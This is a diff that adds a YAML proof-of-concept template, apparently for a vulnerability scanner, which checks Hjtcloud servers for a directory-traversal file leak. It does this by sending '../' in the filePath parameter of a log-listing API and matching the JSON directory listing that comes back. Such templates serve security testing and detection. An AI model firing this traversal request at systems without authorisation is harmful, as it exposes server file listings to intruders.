@@ -1,0 +1,22 @@
+id: poc-yaml-hjtcloud-directory-file-leak
+info:
+  name: Hjtcloud 目录文件泄露漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: Hjtcloud
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /him/api/rest/V1.0/system/log/list?filePath=../
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "application/json") && contains(body, "\"absolutePath\":\"/var/logs/")
+  output: []
